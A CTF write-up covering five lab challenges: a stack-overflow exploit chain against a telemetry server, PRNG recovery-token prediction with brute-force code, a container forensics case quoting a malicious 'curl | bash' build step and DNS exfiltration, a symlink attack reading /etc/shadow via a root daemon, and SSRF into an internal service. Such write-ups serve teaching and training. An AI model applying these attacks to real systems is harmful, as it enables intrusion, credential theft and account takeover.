# CyberAZE CTF Best Challenges Writeup

**Prepared for:** CyberAZE Community

**Prepared by:** First-Place Finisher, Dr4ks

**Date:** September 6, 2026

## Challenges

- [Binary 02 - Telemetry Parser](#binary-02---telemetry-parser)
- [Crypto 02 - Predictable Recovery](#crypto-02---predictable-recovery)
- [Forensics 02 - Container Incident](#forensics-02---container-incident)
- [PrivEsc 02 - Diagnostic Service](#privesc-02---diagnostic-service)
- [Web 02 - Trusted Enumeration](#web-02---trusted-enumeration)


## Detailed Explain

### Binary 02 - Telemetry Parser

**Category:** Pwn / Binary Exploitation
 
#### Vulnerability / Task
 
`telemetryd` (CZTL protocol v2.3.1) is a small forking TCP server. Analysis of the binary and its protocol spec revealed two bugs and a leftover "vendor" function:
 
- **Bug 1 — unbounded diag readback (info leak):** the `0x03` (diag readback) record type never clamps the requested byte count against the true 216-byte aggregation-workspace region on the stack; it will `write_full()` up to 255 bytes starting at the workspace, leaking the stack canary and adjacent saved registers.
- **Bug 2 — truncated bounds check (OOB write):** the `0x01` (telemetry) record handler computes the bounds check using only the **low byte** of the 16-bit `value_len` field (`movzbl %bpl,%edx`), but the subsequent `memcpy`/`read_full` use the **full** 16-bit length. A record with `value_len = 288` passes the truncated check (low byte `0x20` = 32 ≤ 208) while copying the full 288 bytes — a straightforward stack buffer overflow.
- **Dead-but-linked win function:** `diag_dump_secrets()` remains fully linked in the binary (opens a secrets file and writes its contents to the client socket) even though the normal `0x7F` maintenance-record path that would call it returns `ERR` in this production build.
- **Free code-pointer leak:** the connection banner is built with `snprintf(buf, .., "...support-ref %p", handle_connection)`, leaking `handle_connection`'s exact runtime address on every connection — defeating PIE without any brute force.
Binary protections confirmed via `checksec`: `PIE enabled`, `NX enabled`, `Partial RELRO`, `Canary found`. `/proc/sys/kernel/randomize_va_space = 2` (full ASLR) on the host — but the banner leak makes this moot.
 
#### Solving Steps
 
**1. List the challenge files and inspect the binary**
 
```bash
ls -la
file telemetryd
```
 
- 📸 *Screenshot: terminal — `file telemetryd` output confirming architecture (x86-64, dynamically linked, stripped/not stripped)*

![alt text](image-29.png)
 
---
 
**2. Check binary protections**
 
```bash
checksec --file=telemetryd
```
 
- 📸 *Screenshot: terminal — `checksec` output showing `PIE enabled`, `NX enabled`, `Partial RELRO`, `Canary found`*

![alt text](image-30.png)
 
---
 
**3. Diff the protocol spec against the binary's actual record handling**
 
```bash
strings telemetryd | grep -iE "diag|support-ref|ERR|maintenance"
```
 
- 📸 *Screenshot: terminal — `strings` output surfacing `diag_dump_secrets`-related strings and the `support-ref %p` banner format string, both still present despite being "dead" in the documented protocol path*

![alt text](image-31.png)
 
---
 
**4. Disassemble key functions to confirm both bugs**
 
```bash
gdb -batch -ex "disas handle_connection" ./telemetryd
gdb -batch -ex "disas diag_dump_secrets" ./telemetryd
gdb -batch -ex "disas main" ./telemetryd
```
 
- 📸 *Screenshot: GDB disassembly — `handle_connection`, highlighting the truncated `movzbl %bpl,%edx` bounds check on `value_len` vs. the full 16-bit length used by the subsequent copy*

![alt text](image-32.png)

![alt text](image-33.png)
 
- 📸 *Screenshot: GDB disassembly — confirming `main` forks per connection with a `SIGCHLD` reaper, so the PIE base stays constant across the process lifetime*

```bash
gdb -batch \
  -ex "disas main" \
  -ex "info symbol 0x11" \
  ./telemetryd | grep -n -E "call.*fork|call.*signal|call.*sigaction|call.*accept|jmp"
```

![alt text](image-34.png)
 
 
**5. Map the exact stack layout**
 
Confirmed via disassembly: workspace (216B) → canary (8B) → saved `rbx/rbp/r12/r13/r14/r15` (56B) → return address.
 
- 📸 *Screenshot: annotated stack diagram or GDB `x/40gx $rsp` output showing the offsets used to build the overflow payload*

![alt text](image-35.png)
 
---
 
**6. Write and run the exploit**
 
`exploit.py` performs, in order:
- **Leak canary:** send a `0x03` diag-readback record requesting 255 bytes; bytes `[216:224]` of the response are the canary.
- **Leak PIE base:** parse `support-ref 0x...` from the connection banner, subtract `handle_connection`'s fixed file offset (`0x1415`) to get the exact runtime base.
- **Compute target:** `base + 0x16ec` (fixed offset of `diag_dump_secrets`).
- **Overflow:** send a `0x01` telemetry record with `value_len = 288` and payload `216×'A' + canary(8) + 56×'B' + target_address(8, little-endian)`.
- **Trigger the return:** call `socket.shutdown(SHUT_WR)` after sending the payload to force EOF on the server's next read, driving `handle_connection` into its epilogue (`ret`) with the hijacked return address, while keeping the read side open to capture `diag_dump_secrets`' output.
```bash
python3 exploit.py <target-host> <target-port>
```
 
- 📸 *Screenshot: terminal — exploit script running end-to-end (canary leak → PIE base leak → overflow sent)*

![alt text](image-36.png)
 
---
 
**7. Confirm the return-to-function hijack succeeded**
 
Terminal — server response beginning with the `DIAG:` prefix, a string that only originates inside `diag_dump_secrets`, confirming the hijacked return address landed exactly on target

 
#### Result
 
Confirmed a full working return-to-function exploit chain against `telemetryd`: stack-canary leak via the unbounded `0x03` diag-readback record, deterministic PIE-base leak via the connection banner's `%p` format-string leak of `handle_connection`, a stack buffer overflow via the truncated 16-bit bounds check on `0x01` telemetry records, and a hijacked return address redirected into the dead-but-still-linked `diag_dump_secrets()` function — bypassing PIE, NX, and the stack canary without needing to brute-force ASLR at all.
 

### Crypto 02 - Predictable Recovery

**Category:** Crypto
 
#### Vulnerability / Task
 
VaultDesk's account-recovery `TokenGenerator` seeds Python's `random.Random` with a value derived entirely from **predictable inputs**:
 
```python
seed = int(started_at) ^ zlib.crc32(boot_secret.encode())
rng = random.Random(seed)
 
def issue(account):
    self._counter += 1
    return f"{account}-{self._counter}-{rng.getrandbits(96):024x}"
```
 
Two structural weaknesses make tokens predictable:
 
1. **`boot_secret` is static** — baked into the container image's env vars, so it's identical across every restart of the same image version.
2. **The counter is global, not per-account** — every recovery request across *all* tenants pulls the next value from the *same* PRNG stream, so any user's own legitimately-issued token leaks the RNG's internal state at that position for everyone.
With `boot_secret` known and the service's restart time narrowed to a short deploy window (from deploy logs), the only unknown — `started_at` — is small enough to brute-force outright.
 
An incident (`REV-2419`) reported an account (`a.mammadova`) recovered by someone who never requested it. Task: determine whether the issued token could have been predicted by a third party, and reconstruct it.
 
#### Solving Steps
 
**1. List the incident files and read the incident report**
 
```bash
ls -la
cat incident.txt
```
 
- 📸 *Screenshot: terminal — `incident.txt` describing REV-2419, the compromised account `a.mammadova`, and the legitimate-looking recovery-token issuance the user denies requesting*

![alt text](image-21.png)
 
---
 
**2. Review the token generator source**
 
```bash
cat generator.py
```
 
- 📸 *Screenshot: terminal/editor — `TokenGenerator` class showing `seed = int(started_at) ^ zlib.crc32(boot_secret.encode())` and the shared `self._counter` incremented per `issue()` call*

![alt text](image-22.png)
 
---
 
**3. Find the compromised request's exact seq/timestamp in the audit log**
 
```bash
grep "a.mammadova" audit.log
```
 
- 📸 *Screenshot: terminal — matching line showing `seq=74 | account=a.mammadova | action=issue_recovery` at `2026-08-30T17:15:20Z`*

![alt text](image-23.png)
 
---
 
**4. Review the known-good token samples and confirm `seq` == internal counter**
 
```bash
cat issued-samples.json | python3 -m json.tool
```

![alt text](image-24.png)
 
Cross-checked each sample's `requested_at` timestamp against `audit.log` to confirm the counter embedded in each token (`account-<counter>-<hex>`) matches its logged `seq` value exactly.
 
```bash
grep "m.huseynov" audit.log
```
 
- 📸 *Screenshot: side-by-side — `issued-samples.json` tokens and their matching `seq` numbers in `audit.log`*

![alt text](image-25.png)
 
---
 
**5. Get the fixed boot secret and restart window from service metadata**
 
```bash
cat service-metadata.json | python3 -m json.tool
```
 
- 📸 *Screenshot: terminal — `service-metadata.json` showing `"BOOT_SECRET": "vd-ts-img-7f3e9a1c25b4d608"`, the `deploy_history` restart window (`2026-08-30T14:00:00Z/2026-08-30T14:10:00Z`, "config reload required full restart"), and the `token-svc:1.5.0` image version confirming the secret is unchanged across that restart*

![alt text](image-26.png)

---
 
**6. Brute-force the boot timestamp / recover the seed**
 
Wrote a script to try every second in the ~10-minute window, replaying `random.Random(seed)` and checking whether it reproduces all known `m.huseynov` token values at their exact counter positions.
 
```python
import zlib, random, datetime
 
boot_secret = "vd-ts-img-7f3e9a1c25b4d608"
crc = zlib.crc32(boot_secret.encode())
 
known = {
    5:  "3931242503ade50ec4862015",
    33: "9088b72122334c94d235fc98",
    80: "00a5fb29df2822addd95d267",
}
 
start = datetime.datetime(2026,8,30,14,0,0, tzinfo=datetime.timezone.utc)
end   = datetime.datetime(2026,8,30,14,10,10, tzinfo=datetime.timezone.utc)
 
t = start
while t <= end:
    ts = int(t.timestamp())
    seed = ts ^ crc
    rng = random.Random(seed)
    ok = True
    for i in range(1, max(known)+1):
        v = f"{rng.getrandbits(96):024x}"
        if i in known and v != known[i]:
            ok = False
            break
    if ok:
        print("FOUND seed timestamp:", ts, t)
        break
    t += datetime.timedelta(seconds=1)
```
 
```bash
python3 find_seed.py
```
 
- 📸 *Screenshot: terminal output — `FOUND seed timestamp: 1788098592 2026-08-30 14:03:12+00:00`, confirming all 3 known samples matched exactly*

![alt text](image-27.png)
 
---
 
**7. Replay the recovered seed to the victim's counter position**
 
With the seed confirmed, replayed the same deterministic RNG stream to `seq=74` (the incident's counter) to reconstruct the exact token that was issued.
 
```python
import random
 
seed = 1788098592 ^ 34336402   # recovered ts XOR crc32(boot_secret)
rng = random.Random(seed)
 
target_seq = 74
val = None
for i in range(1, target_seq + 1):
    val = f"{rng.getrandbits(96):024x}"
 
print(f"a.mammadova-{target_seq}-{val}")
```
 
```bash
python3 predict_token.py
```
 
- 📸 *Screenshot: terminal output — predicted token `a.mammadova-74-bd00b37d5eea5bad251a8b8d`*

![alt text](image-28.png)

---
 
#### Result
 
Confirmed the recovery token issued for `a.mammadova`'s account was **fully predictable** by any third party who had obtained a small number of their own legitimately-issued tokens from the same service boot. Root cause: a cryptographically weak, time-and-static-secret-derived PRNG seed combined with a **globally shared** (not per-account) counter — allowing full reconstruction of any other user's token via a ~600-timestamp brute force, with no access to server-side secrets beyond what was already exposed in deployment metadata.
 
#### Flag
```
CYBERAZE{bd00b37d5eea5bad251a8b8d}
```

### Forensics 02 - Container Incident
 
**Category:** Forensics (Hard)
 
#### Vulnerability / Task
 
A production container was suspected compromised via a poisoned image. Given registry events, CI logs, docker events, and DNS logs, needed to identify the poisoned tag, compromised container, and exfiltration domain.
 
#### Solving Steps
 
**1. Find the off-cadence image tag in registry events**
 
```bash
jq -r '.events[] | .tag' registry-events.json | sort | uniq -c | sort -n
```
 
![alt text](image-5.png)
---
 
**2. Diff the CI job against the known-good baseline**
 
```bash
diff ci-job-baseline.log ci-job.log
```
 
![alt text](image-6.png)
```
  Step 6/9 : RUN curl -fsSL https://dep-proxy.pkg-cache.net/v1/bootstrap.sh | bash
```

 
**3. Confirm the poisoned build's digest and push event**
 
```bash
jq -c '.events[] | select(.tag=="2.14.3-hotfix.1")' registry-events.json
```
 
- 📸 *Screenshot: terminal — push event for `billing/api:2.14.3-hotfix.1`, actor `svc-gitlab-ci`, digest `sha256:d7a04b19c3e1...`*

![alt text](image-7.png)
 
---
 
**4. Identify the compromised container in docker events**
 
```bash
jq -c '.events[] | select(.Actor.Attributes.image != null and (.Actor.Attributes.image | test("hotfix")))' docker-events.json
```
 
- 📸 *Screenshot: terminal — `create`/`start` events for `billing-worker-x7f2d`, image `registry.northstar.io/billing/api:2.14.3-hotfix.1`, namespace `prod`

![alt text](image-9.png)
 
---
 
**5. Confirm the container's lifecycle (start → exit)**
 
```bash
jq -c '.events[] | select(.Actor.Attributes.name=="billing-worker-x7f2d" or .Actor.Attributes.container=="billing-worker-x7f2d")' docker-events.json
```

![alt text](image-11.png)
 
---
 
**6. Isolate DNS traffic from the compromised container's IP**
 
```bash
grep '172.19.0.14' dns.log
grep '172.19.0.14' dns.log | grep -ivE 'northstar\.io|k8s\.prod\.svc|internal-api\.prod\.svc|microsoftonline\.com|pypi\.org|pythonhosted\.org'
```
 
- 📸 *Screenshot: terminal — filtered output showing normal traffic (github.com, pypi.org, etc.) followed by the suspicious burst*

![alt text](image-12.png)
 
---
 
**7. Confirm the DNS tunneling / exfiltration pattern**
 
```bash
grep '172.19.0.14' dns.log | grep 'metrics-relay.net' | wc -l
grep '172.19.0.14' dns.log | grep 'metrics-relay.net' | head -20
```
 
![alt text](image-13.png)
 
---
 
#### Result
 
Full attack chain reconstructed: a malicious build step (`curl | bash` from `dep-proxy.pkg-cache.net`) was smuggled into a one-off `2.14.3-hotfix.1` tag during CI, bypassing the normal release cadence. This poisoned image was deployed as container `billing-worker-x7f2d`, which — shortly after starting — began exfiltrating data via DNS tunneling, encoding it into high-entropy hex labels under `sync.metrics-relay.net`, disguised to blend in with legitimate `metrics/agent` traffic already present on the network. The container exited cleanly once exfiltration completed.
 
#### Flag
```
CYBERAZE{2.14.3-hotfix.1_billing-worker-x7f2d_metrics-relay.net}
```

### PrivEsc 02 - Diagnostic Service

 
**Category:** Linux Privilege Escalation
 
#### Vulnerability / Task
 
A daemon (`vaultdiagd.py`) runs as **root**, listening on a Unix domain socket (`/run/vaultdiag.sock`, mode `root:diag 0660`). The low-privileged `developer` user is a member of the `diag` group and has write access to `/etc/vaultdiag/conf.d/`. The daemon exposes an `inspect <name>` command intended to dump config files under `/etc/vaultdiag/`, using this containment check:
 
```python
def resolve_config(name):
    """Confine `inspect` to files under CONFIG_ROOT."""
    if not name or name.startswith("/"):
        raise ValueError("absolute paths are not allowed")
    cand = os.path.normpath(os.path.join(CONFIG_ROOT, name))
    if cand != CONFIG_ROOT and not cand.startswith(CONFIG_ROOT + "/"):
        raise ValueError("path escapes the configuration root")
    return cand
```
 
The check only validates the **literal string** of the resolved path — it never calls `os.path.realpath()` to resolve symlinks. `cmd_inspect()` then opens the path with plain `open()`, which **does** follow symlinks. Since the attacker can write into `conf.d/`, planting a symlink there tricks the root daemon into reading and returning the contents of any file on the filesystem — a classic confused-deputy / symlink-following arbitrary file read.
 
#### Solving Steps
 
**1. Confirm privileges and daemon presence**
 
```bash
id
ps auxww | grep vaultdiag
ls -la /etc/vaultdiag/conf.d
```
 
- 📸 *Screenshot: terminal — `id` showing `groups=1000(developer),998(diag)`, confirming `diag` group membership; `ps` showing `vaultdiagd.py` running as root*

![alt text](image-14.png)
 
---
 
**2. Review the daemon source to confirm the missing `realpath()` check**
 
```bash
cat /opt/vaultdiag/vaultdiagd.py
grep -n "resolve_config\|realpath\|normpath" /opt/vaultdiag/vaultdiagd.py
```
 
- 📸 *Screenshot: terminal/editor — `resolve_config()` function highlighted, showing string-only path validation with no `os.path.realpath()` call*

![alt text](image-15.png)
 
---
 
**3. Confirm socket permissions allow connection as `developer`**
 
```bash
ls -la /run/vaultdiag.sock
```
 
- 📸 *Screenshot: terminal — socket showing `srw-rw---- root diag`, confirming `diag` group can connect*

![alt text](image-16.png)

---
 
**4. Plant a symlink inside the writable config directory**
 
```bash
ln -s /etc/shadow /etc/vaultdiag/conf.d/pwn
ls -la /etc/vaultdiag/conf.d/pwn
```
 
- 📸 *Screenshot: terminal — `ls -la` showing the new symlink `pwn -> /etc/shadow`*

![alt text](image-17.png)
 
---
 
**5. Connect to the daemon's Unix socket and request the symlink via `inspect`**
 
```python
import socket
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect('/run/vaultdiag.sock')
s.sendall(b'inspect conf.d/pwn\n')
print(s.recv(65536).decode(errors='replace'))
```
 
```bash
python3 -c "
import socket
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect('/run/vaultdiag.sock')
s.sendall(b'inspect conf.d/pwn\n')
print(s.recv(65536).decode(errors='replace'))
"
```
 
- 📸 *Screenshot: terminal — daemon response containing full `/etc/shadow` content (root and system account password hash lines)*

![alt text](image-18.png)

---
 
**6. Generalize the primitive — repoint the symlink at any root-readable target (e.g. the flag)**
 
```bash
rm /etc/vaultdiag/conf.d/pwn
ln -s /root/flag /etc/vaultdiag/conf.d/pwn

 
python3 -c "
import socket
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect('/run/vaultdiag.sock')
s.sendall(b'inspect conf.d/pwn\n')
print(s.recv(65536).decode(errors='replace'))
"
```
 
- 📸 *Screenshot: terminal — daemon response containing the flag file contents*

![alt text](image-19.png)
 
---
 
#### Result
 
Successfully leaked `/etc/shadow` (and, by repointing the symlink, any root-readable file including the target flag) by exploiting a confused-deputy vulnerability in the root-owned `vaultdiagd` daemon: its path-containment check validated only the literal path string and never resolved symlinks via `realpath()`, while the file-open call that followed did. Group membership in `diag` (for socket access) plus write access to `conf.d/` (for planting the symlink) was sufficient for a full arbitrary-file-read-as-root primitive, with no daemon restart or additional privileges required.


### Web 02 - Trusted Enumeration

**Category:** Web

#### Vulnerability / Task

VaultDesk's "import from URL" feature is fetched server-side by an internal Integration Worker, which can also reach an internal-only document service. Demonstrate SSRF impact.

#### Solving Steps
- `GET /api/v1/integrations/status` leaked the internal service's exact address and trust model:
![alt text](image.png)

    Egress policy blocked loopback literals and link-local metadata — **but not internal DNS hostnames**.

- Abused `POST /integrations/import` with `url=http://internal-docs:9000/` to pivot through the worker into the restricted VLAN.

    ![alt text](image-1.png)

- The internal service admitted it was **not authenticated** ("requests from the integration network are pre-authenticated") — pure network-based trust.

- Enumerated `/records`, found a `RESTRICTED`-classified cross-tenant record:
    ![alt text](image-2.png)

- Send a requset to specific record:
    ![alt text](image-3.png)

#### Result

Full SSRF chain: attacker-controlled `url` parameter → internal Integration Worker → unauthenticated internal service on a "restricted VLAN" → disclosure of another tenant's RESTRICTED custody record. (Exact record content pending final retrieval at time of writing.)

